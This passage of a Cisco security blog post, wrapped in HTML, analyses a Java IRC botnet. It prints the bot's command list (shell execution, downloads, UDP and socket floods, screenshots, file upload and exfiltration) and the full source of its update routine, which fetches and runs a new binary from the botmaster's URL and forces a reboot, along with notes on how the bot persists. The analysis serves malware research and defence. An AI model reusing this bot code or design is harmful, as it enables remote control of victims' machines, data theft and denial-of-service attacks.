+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="s">&quot;$getUsername&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$sendMessage&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$execute&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$shellcommand&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$download&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$commandList&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$directCommandTo&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$resetDirect&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$setNick&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$setSuffix&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$setPrefix&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$sockFlood&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;stopSockFlood&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$udpFlood&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$stopUdp&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">startsWith</span><span class="o">(</span><span class="s">&quot;$takeScreenshot&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$getHomeDir&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$getOS&quot;</span><span class="o">))</span> <span class="o">{</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$mkshell&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$mkdir&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$cd&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$ls&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$shellExec&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$rootDir&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$getLocation&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$update&quot;</span><span class="o">))</span>
+
+
+
+		<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$httpf&quot;</span><span class="o">))</span> <span class="o">{</span>
+
+		<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$stopFloods&quot;</span><span class="o">))</span> <span class="o">{</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$processList&quot;</span><span class="o">))</span>
+
+		<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$sendFile&quot;</span><span class="o">))</span> 
+
+		<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$uploadFile&quot;</span><span class="o">))</span> <span class="o">{</span>
+
+
+
+		<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$disableProcessChecking&quot;</span><span class="o">))</span> <span class="o">{</span>
+
+		<span class="k">if</span><span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$enableProcessChecking&quot;</span><span class="o">))</span> <span class="o">{</span>
+
+
+
+		<span class="k">if</span> <span class="o">(</span><span class="n">cmd</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&quot;$close&quot;</span><span class="o">))</span>
+
+</pre>
+</div>
+</div>
+<p>This <font color="red">bot</font>&#8217;s update system is fairly straight forward. At every step the <font color="red">botmaster</font> has the <font color="red">bot</font> informing him of its current status. As input, the <font color="red">function</font> takes the url of the new binary, an <font color="red">integer</font>, and new binary name followed by the old binary name.  The <font color="red">integer</font> is used as a boolean variable to determine if the box should reboot after the update is applied. When the process is started, the old binary in the <font color="red">user</font>&#8217;s <font color="red">home directory</font> is deleted. Next the update is downloaded twice, once to the <font color="red">user</font>&#8217;s <font color="red">home directory</font> and the other goes into the <font color="red">startup</font> location. Once the update is successfully downloaded, the bool dictates that either the <font color="red">bot</font> reboots the machine, causing the copy located in the <font color="red">startup</font> location to be executed, or the <font color="red">bot</font> immediately launches the copy in the <font color="red">user</font>&#8217;s <font color="red">home directory</font>.</p>
+<div class="scrollable">
+<div class="highlight">
+<pre><span class="k"></span> <span class="nn"></span><span class="o"></span>
+
+
+
+	<span class="k">public</span> <span class="nf">Update</span><span class="o">(</span><span class="n">String</span> <span class="n">updateLocation</span><span class="o">,</span> <span class="kt">int</span> <span class="n">restart</span><span class="o">,</span> <span class="n">String</span> <span class="n">localName</span><span class="o">,</span> <span class="n">String</span> <span class="n">oldFileName</span><span class="o">)</span> <span class="o">{</span>
+
+
+
+		<span class="k">this</span><span class="o">.</span><span class="na">updateLocation</span> <span class="o">=</span> <span class="n">updateLocation</span><span class="o">;</span>
+
+		<span class="k">this</span><span class="o">.</span><span class="na">restart</span> <span class="o">=</span> <span class="n">restart</span><span class="o">;</span>
+
+
+
+		<span class="k">this</span><span class="o">.</span><span class="na">localName</span> <span class="o">=</span> <span class="n">localName</span><span class="o">;</span>
+
+		<span class="k">this</span><span class="o">.</span><span class="na">oldFileName</span> <span class="o">=</span> <span class="n">oldFileName</span><span class="o">;</span>
+
+
+
+	<span class="o">}</span>
+
+	<span class="c">/**</span>
+
+<span class="c">	 * Starts the update process on a new thread</span>
+
+<span class="c">	 */</span>
+
+	<span class="k">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
+
+
+
+		<span class="n">File</span> <span class="n">file</span><span class="o">;</span>
+
+		<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">&quot;[Update:] Deleteing old file!&quot;</span><span class="o">);</span>
+
+
+
+		<span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&quot;user.home&quot;</span><span class="o">)+</span><span class="s">&quot;//&quot;</span><span class="o">+</span><span class="n">oldFileName</span><span class="o">+</span><span class="s">&quot;.jar&quot;</span><span class="o">);</span>
+
+
+
+		<span class="n">file</span><span class="o">.</span><span class="na">delete</span><span class="o">();</span>
+
+		<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">&quot;[Update:] Deleteted old file!!&quot;</span><span class="o">);</span>
+
+
+
+		<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">&quot;[Update:] Starting to download update from &quot;</span><span class="o">+</span><span class="n">updateLocation</span><span class="o">);</span>
+
+		<span class="n">down</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Downloader</span><span class="o">(</span><span class="n">updateLocation</span><span class="o">,</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&quot;user.home&quot;</span><span class="o">)+</span><span class="s">&quot;//&quot;</span><span class="o">+</span><span class="n">localName</span><span class="o">+</span><span class="s">&quot;.jar&quot;</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+
+
+
+		<span class="n">down</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+		<span class="n">down</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Downloader</span><span class="o">(</span><span class="n">updateLocation</span><span class="o">,</span> <span class="n">Misc</span><span class="o">.</span><span class="na">findStartup</span><span class="o">()+</span><span class="s">&quot;//&quot;</span><span class="o">+</span><span class="n">localName</span><span class="o">+</span><span class="s">&quot;.jar&quot;</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
+
+
+
+		<span class="n">down</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+		<span class="n">CommandExecute</span> <span class="n"><font color="red">cmd</font></span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandExecute</span><span class="o">(</span><span class="s">&quot;START &quot;</span><span class="o">+</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&quot;user.home&quot;</span><span class="o">)+</span><span class="s">&quot;//&quot;</span><span class="o">+</span><span class="n">localName</span><span class="o">+</span><span class="s">&quot;.jar&quot;</span><span class="o">);</span>
+
+
+
+		<span class="n">cmd</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+		<span class="k">try</span> <span class="o">{</span>
+
+			<span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">2000</span><span class="o">);</span>
+
+
+
+		<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+
+			<span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+
+
+
+		<span class="o">}</span>
+
+		<span class="k">if</span><span class="o">(</span><span class="n">restart</span> <span class="o">==</span> <span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
+
+			<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">&quot;[Update:] Restart needed, expect connection to be closed!&quot;</span><span class="o">);</span>
+
+
+
+			<span class="n">command</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CommandExecute</span><span class="o">(</span><span class="s">&quot;shutdown -f -r&quot;</span><span class="o">);</span>
+
+			<span class="n">command</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+
+
+			<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">&quot;[Update:] Restart command executed!&quot;</span><span class="o">);</span>
+
+		<span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+
+
+
+			<span class="n">IRC</span><span class="o">.</span><span class="na">sendMessage</span><span class="o">(</span><span class="n">Config</span><span class="o">.</span><span class="na">getChannel</span><span class="o">(),</span> <span class="s">&quot;[Update:] Update downloaded, changes will not take effect &quot;</span> <span class="o">+</span>
+
+					<span class="s">&quot;until a restart has taken place!&quot;</span><span class="o">);</span>
+
+
+
+			<span class="k">try</span> <span class="o">{</span>
+
+				<span class="n">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">10000</span><span class="o">);</span>
+
+			<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">InterruptedException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+
+
+
+				<span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+
+			<span class="o">}</span>
+
+			<span class="n">Restart</span> <span class="n">res</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Restart</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&quot;user.home&quot;</span><span class="o">)+</span><span class="s">&quot;//&quot;</span><span class="o">+</span><span class="n">localName</span><span class="o">+</span><span class="s">&quot;.jar&quot;</span><span class="o">,</span> <span class="mi">5</span><span class="o">);</span>
+
+
+
+			<span class="n">res</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
+
+		<span class="o">}</span>
+
+	<span class="o">}</span>
+
+	
+
+	<span class="k">private</span> <span class="n">String</span> <span class="n">updateLocation</span><span class="o">;</span>
+
+
+
+	<span class="k">private</span> <span class="kt">int</span> <span class="n">restart</span><span class="o">;</span>
+
+	<span class="k">private</span> <span class="n">String</span> <span class="n">localName</span><span class="o">;</span>
+
+	<span class="k">private</span> <span class="n">String</span> <span class="n">oldFileName</span><span class="o">;</span>
+
+
+
+	<span class="k">private</span> <span class="n">Downloader</span> <span class="n">down</span><span class="o">;</span>
+
+	<span class="k">private</span> <span class="n">CommandExecute</span> <span class="n">command</span><span class="o">;</span>
+
+<span class="o">}</span>
+
+
+
+</pre>
+</div>
+</div>
+<style type="text/css">
+<p>div.scrollable  {
+    overflow: auto;
+    <font color="red">height</font>: 400px;
+    <font color="red">width</font>: auto;
+}
+td.linenos { background-color: #f0f0f0; padding-right: 10px; }
+span.lineno { background-color: #f0f0f0; padding: 0 5px 0 5px; }</p>
+<p>/* For Pygmentized text */
+body  { background: #f8f8f8; }
+body .c { color: #408080; font-style: italic } /* Comment */
+body .err { border: 1px solid #FF0000 } /* Error */
+body .k { color: #008000; font-weight: bold } /* Keyword */
+body .o { color: #666666 } /* Operator */
+body .cm { color: #408080; font-style: italic } /* Comment.Multiline */
+body .cp { color: #BC7A00 } /* Comment.Preproc */
+body .c1 { color: #408080; font-style: italic } /* Comment.Single */
+body .cs { color: #408080; font-style: italic } /* Comment.Special */
+body .gd { color: #A00000 } /* Generic.Deleted */
+body .ge { font-style: italic } /* Generic.Emph */
+body .gr { color: #FF0000 } /* Generic.Error */
+body .gh { color: #000080; font-weight: bold } /* Generic.Heading */
+body .gi { color: #00A000 } /* Generic.Inserted */
+body .go { color: #808080 } /* Generic.Output */
+body .gp { color: #000080; font-weight: bold } /* Generic.Prompt */
+body .gs { font-weight: bold } /* Generic.Strong */
+body .gu { color: #800080; font-weight: bold } /* Generic.Subheading */
+body .gt { color: #0040D0 } /* Generic.Traceback */
+body .kc { color: #008000; font-weight: bold } /* Keyword.Constant */
+body .kd { color: #008000; font-weight: bold } /* Keyword.Declaration */
+body .kp { color: #008000 } /* Keyword.Pseudo */
+body .kr { color: #008000; font-weight: bold } /* Keyword.Reserved */
+body .kt { color: #B00040 } /* Keyword.Type */
+body .m { color: #666666 } /* Literal.Number */
+body .s { color: #BA2121 } /* Literal.String */
+body .na { color: #7D9029 } /* Name.Attribute */
+body .nb { color: #008000 } /* Name.Builtin */
+body .nc { color: #0000FF; font-weight: bold } /* Name.Class */
+body .no { color: #880000 } /* Name.Constant */
+body .nd { color: #AA22FF } /* Name.Decorator */
+body .ni { color: #999999; font-weight: bold } /* Name.Entity */
+body .ne { color: #D2413A; font-weight: bold } /* Name.Exception */
+body .nf { color: #0000FF } /* Name.Function */
+body .nl { color: #A0A000 } /* Name.Label */
+body .nn { color: #0000FF; font-weight: bold } /* Name.Namespace */
+body .nt { color: #008000; font-weight: bold } /* Name.Tag */
+body .nv { color: #19177C } /* Name.Variable */
+body .ow { color: #AA22FF; font-weight: bold } /* Operator.Word */
+body .w { color: #bbbbbb } /* Text.Whitespace */
+body .mf { color: #666666 } /* Literal.Number.Float */
+body .mh { color: #666666 } /* Literal.Number.Hex */
+body .mi { color: #666666 } /* Literal.Number.Integer */
+body .mo { color: #666666 } /* Literal.Number.Oct */
+body .sb { color: #BA2121 } /* Literal.String.Backtick */
+body .sc { color: #BA2121 } /* Literal.String.Char */
+body .sd { color: #BA2121; font-style: italic } /* Literal.String.Doc */
+body .s2 { color: #BA2121 } /* Literal.String.Double */
+body .se { color: #BB6622; font-weight: bold } /* Literal.String.Escape */
+body .sh { color: #BA2121 } /* Literal.String.Heredoc */
+body .si { color: #BB6688; font-weight: bold } /* Literal.String.Interpol */
+body .sx { color: #008000 } /* Literal.String.Other */
+body .sr { color: #BB6688 } /* Literal.String.Regex */
+body .s1 { color: #BA2121 } /* Literal.String.Single */
+body .ss { color: #19177C } /* Literal.String.Symbol */
+body .bp { color: #008000 } /* Name.Builtin.Pseudo */
+body .vc { color: #19177C } /* Name.Variable.Class */
+body .vg { color: #19177C } /* Name.Variable.Global */
+body .vi { color: #19177C } /* Name.Variable.Instance */
+body .il { color: #666666 } /* Literal.Number.Integer.Long */
+  </style>
+<p>It is important to note that the <font color="red">bot</font> is always stored in two locations on the victim&#8217;s system. The first copy is stored in the <font color="red">user</font>&#8217;s <font color="red">home directory</font> and the second in a <font color="red">startup</font> location that the <font color="red">botmaster</font> has inserted as a registry key. The <font color="red">startup</font> basically <font color="red">functions</font> as a backup. If anything goes wrong during the update or if the <font color="red">user</font> kills the <font color="red">bot</font> the system will reload the binary upon reboot.</p>
+<p>The <font color="red">botmaster</font>&#8217;s update mechanism is strange. It seems illogical to delete the old binary before downloading the update. It is also puzzling that the author chose to download the file twice instead of copying the first download to the other location. </p>
+<p>As you can see from the exception mentioned above and the curious nature of the update mechanism, this software is not typical of commercial-level developers. Despite what the media and pop culture would lead you to believe, a fair percentage of <font color="red">malware</font> authors are not amazing coders. The majority appear to adapt other people&#8217;s code to serve a specific purpose without fully understanding the code. Most appear to be self-educated, which may explain some of the oddities that would be corrected following a typical development cycle. </p>
+<p>In the <font color="red">next post</font> we will explore offensive flooding. The ability to create a denial of service attack is built into nearly all <font color="red">botnets</font>, and is often used to extort money from companies. After discussing different types of floods in general and how they can affect <font color="red">networks</font>, we will examine some of the different offensive <font color="red">functions</font> available to the <font color="red">botmaster</font>.</p>
+Tags:<br /><ul class = "tagged"><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=botnets">botnets</a></li><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=security-2">security</a></li><li><a class = "post_tags" href="https://blogs.cisco.com/?tag=security-research">security research</a></li></ul>		</div>
+			<div id = "comments">
+				<div id = "respond">
+				<p class = "cisco_respond">In an effort to keep conversations fresh, Cisco Blogs closes comments after 60 days. Please visit the <a href ="https://blogs.cisco.com">Cisco Blogs hub page</a> for the latest content.</p>
+		</div>
+
+			</div>
+		</article>
+
+	</div>
+	<div id = "main_right">
+		<ul id = "sidebar">
+
+  <li id="subscribe" class="widget">
+    <h3>Subscribe to Security:</h3>
+    <div id="subscribe_box">
+      <form id ="subscribe_form" action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open('https://feedburner.google.com/fb/a/mailverify?uri=CiscoBlogSecurity', 'popupwindow', 'scrollbars=yes,width=550,height=520');return true">
+        <input type="text" class="subscribe" name="email" value="Enter email address" onFocus="if(this.value == 'Enter email address') {this.value = '';}" onBlur="if (this.value == '') {this.value = 'Enter email address';}"></input>
+        <input type="hidden" value="CiscoBlogSecurity" name="uri" ></input>
+        <input type="hidden" name="loc" value="en_US"></input>
+        <input type="submit" class="subscribe_button" value="Subscribe" ></input>
+        <div class="clear"></div>
+      </form>
+    </div>
+    <div class="clear"></div>
+
+</li>
+
+<li id="social_widget" class="widget">
+  <h3>Connect with Security</h3>
+  <ul>
+        <li><a target='_blank' href="https://www.facebook.com/ciscosecurity?ref=nf"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_fb.png" alt="Facebook"></a></li>
+    <li><a target='_blank' href="https://twitter.com/ciscosecurity"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_tw.png" alt="Twitter"></a></li>
+    <li><a target='_blank' href="http://www.linkedin.com/company/cisco"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_li.png" alt="Linkedin"></a></li>
+    <li><a target='_blank' href="https://plus.google.com/106092229730683979920"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_gp.png" alt="Google+"></a></li>
+    <li><a target='_blank' href="https://www.slideshare.net/ciscosystems"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_ss.png" alt="Slideshare"></a></li>
+    <li><a target='_blank' href="http://youtubecisco.com/security"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_yt.png" alt="YouTube"></a></li>
+    <li><a target='_blank' href="https://www.instagram.com/cisco/?hl=en"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/follow_ig.png" alt="Instagram"></a></li>
+    <li><a href="https://feeds.feedburner.com/CiscoBlogSecurity"><img src="https://blogs.cisco.com/wp-content/themes/cisco_responsive/img/rss.png" width = "24" height = "24" alt = "Rss"></a></li>
+      </ul>
+</li>
+	<li>
+		<div id = "nitroLoggedOut" class="widget">
+			<div class = "consoleTitle">
+				Cisco Social Rewards
+			</div>
+			<div class = "consoleTextNoLog">
+				Get credit for all your Cisco site participation with Social Rewards. <a href = "https://blogs.cisco.com/rewards-about">Learn More</a>			</div>
+						<a href = "https://socialrewards-prod.cloudapps.cisco.com/" class = "joinNow">Join Today</a>
+			<div class = "consoleTextNoLog">
+				Already a member?  <a href = "https://socialrewards-prod.cloudapps.cisco.com/" class = "already">Log In</a>
+			</div>
+			</div>
+</li> 	<script>
+
+
+	nitro.callAPI("method=site.getActionFeed&apiKey=6912c6c82ccc4863a0311dc8b586b8fb&showLevelChanges=true&preferences=userFullName|profileUrl|userPhotoUrl", "newsfeed");
+	</script>
+	<li>
+		 <div id ="newsfeedWidget">
+			<div class = "newsfeed_header">
+				Latest Rewards
+				<a href = "https://blogs.cisco.com/rewards-about" class = "newsIcon"><img src = "/wp-content/plugins/bunchball/images/infoIcon.png"></a>
+			</div>
+			<div id = "newsInnerContent">
+				<ul id = "newsfeed">
+				</ul>
+			</div>
+		</div>
+	</li>
+    <li id="blogroll">
+            <ul id="blogroll_links">
+          <li class="roll_heading">What We're Reading</li>
+
+            <li><a href="http://www.cert.org/blogs/vuls/" target="_blank">CERT Vulnerability Analysis</a></li>
+                      <li><a href="http://blogs.technet.com/b/srd/" target="_blank">Microsoft Security Research & Defense</a></li>
+                      <li><a href="http://isc.sans.edu/index.html" target="_blank">SANS Internet Storm Center</a></li>
+                      <li><a href="http://www.schneier.com/" target="_blank">Schneier on Security</a></li>
+                  </ul>
+              <ul id="related_links">
+          <li class="roll_heading">Related Links</li>
+                    <li><a href="http://www.cisco.com/en/US/products/products_security_advisories_listing.html" target="_blank">Advisories and Responses</a></li>
+                        <li><a href="http://tools.cisco.com/security/center/cyberRiskReport.x" target="_blank">Cyber Risk Reports</a></li>
+                        <li><a href="http://tools.cisco.com/security/center/intelliPapers.x?i=55" target="_blank">Security Best Practices</a></li>
+                        <li><a href="http://tools.cisco.com/security/center/home.x" target="_blank">Security Intelligence Operations</a></li>
+                        <li><a href="http://www.cisco.com/en/US/products/hw/vpndevc/index.html" target="_blank">Security Products</a></li>
+                  </ul>
+          </li>
+  </ul>	</div>
+	<div class = "clear"></div>
+</div>
+</div>
+</div>
+   
+
+<div class="sb-slidebar sb-left sb-width-custom sb-momentum-scrolling " data-sb-width="50%">
+    <nav>
+  <a class = "hamburger_login" href = "https://blogs.cisco.com:9031/sp/startSSO.ping?PartnerIdpId=cloudsso.cisco.com">Log In to Cisco.com</a>      <ul>
+                  <li><a href='https://blogs.cisco.com'><span>All Blogs</span></a></li>
+                  <li><a href='#'><span>Technologies</span></a>
+                  <ul>
+            <div class = "bordertop"></div>
+            <li><a href="https://blogs.cisco.com/analytics-automation">Analytics &amp; Automation</a></li>
+            <li><a href="https://blogs.cisco.com/cloud">Cloud</a></li>
+            <li><a href='https://blogs.cisco.com/collaboration'>Collaboration</a></li>
+            <li><a href='https://blogs.cisco.com/datacenter'>Data Center</a></li>
+            <li><a href='https://blogs.cisco.com/digital'>Digital Transformation</a></li>
+            <li><a href='https://blogs.cisco.com/enterprise'>Enterprise Networks</a></li>
+            <li><a href='https://blogs.cisco.com/innovation'>Innovation</a></li>
+            <li><a href='https://blogs.cisco.com/wireless'>Mobility</a></li>
+            <li><a href='https://blogs.cisco.com/security'>Security</a></li>
+            <li class = "sub"><a href="https://blogs.cisco.com/talos" class="nav_menu" title="">Threat Research</a></li>
+            <li><a href='https://blogs.cisco.com/smallbusiness'>Small Business</a></li>
+            <li><a href='https://blogs.cisco.com/services'>Services</a></li>
+            <li><a href='https://blogs.cisco.com/sp'>SP360:Service Provider</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Industries</span></a>
+                      <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/education'>Education</a></li>
+            <li><a href='https://blogs.cisco.com/energy'>Energy</a></li>
+            <li><a href='https://blogs.cisco.com/financialservices'>Financial Services</a></li>
+            <li><a href='https://blogs.cisco.com/government'>Government</a></li>
+            <li><a href='https://blogs.cisco.com/healthcare'>Healthcare</a></li>
+            <li><a href='https://blogs.cisco.com/manufacturing'>Manufacturing</a></li>
+            <li><a href='https://blogs.cisco.com/retail'>Retail &amp; Hospitality</a></li>
+          </ul>
+        </li>
+                  <li><a href='#'><span>Partners</span></a> 
+          <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/partner'>Partner</a></li>
+          </ul>
+        </li>
+        <li><a href='#'><span>For the Tech Expert</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/getyourbuildon'>Architects &amp; Distinguished Engineers</a></li>
+            <li><a href='https://blogs.cisco.com/developer'>Developer</a></li>
+            <li><a href='https://blogs.cisco.com/performance'>High Performance Computing</a></li>
+            <li><a href='https://blogs.cisco.com/ciscoit'>Inside Cisco IT</a></li>
+            <li><a href='https://blogs.cisco.com/cin'>TechWiseTV</a></li>
+          </ul>
+        </li>
+         <li><a href='#'><span>Get to Know Cisco</span></a>           <ul>
+            <div class = "bordertop"></div>
+            <li><a href='https://blogs.cisco.com/csr'>Corporate Social Responsibility</a></li>
+            <li><a href='https://blogs.cisco.com/cle'>Connected Life Exchange</a></li>
+            <li><a href='https://blogs.cisco.com/customerstories'>Customer Stories</a></li>
+            <li><a href='https://blogs.cisco.com/socialmedia'>Digital and Social Media</a></li>
+            <li><a href='https://blogs.cisco.com/gov'>High Tech Policy</a></li>
+            <li><a href='https://blogs.cisco.com/diversity'>Inclusion and Diversity</a></li>
+            <li><a href='https://blogs.cisco.com/lifeatcisco'>Life at Cisco</a></li>
+            <li><a href='https://blogs.cisco.com/perspectives'>Perspectives</a></li>
+            <li><a href='https://blogs.cisco.com/news'>Executive Platform: News &amp; Insights</a></li>
+          </ul>
+        </li>
+        <li class = "countries"><a href='#'><span>Countries and Regions</span></a>
+          <ul>
+            <div class = "col_1">
+  <li><a href="https://apjc.thecisconetwork.com/">Asia Pacific</a>
+  <li><a href="https://gblogs.cisco.com/at/">Austria</a>
+  <li><span class = "sub_main">Belgium</span></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be">Dutch</a></li>
+    <li class = "sub"><a href="https://gblogs.cisco.com/be-fr">French</a></li>
+  <li><a href="https://gblogs.cisco.com/br/">Brazil</a>
+  <li><span class = "sub_main">Canada</span></li>
+    <li class = "sub"><a href="https://canadablog.cisco.com/">English</a></li>
+    <li class = "sub"><a href="https://ciscocanadafr.wordpress.com/">French</a></li>
+
+  </div>
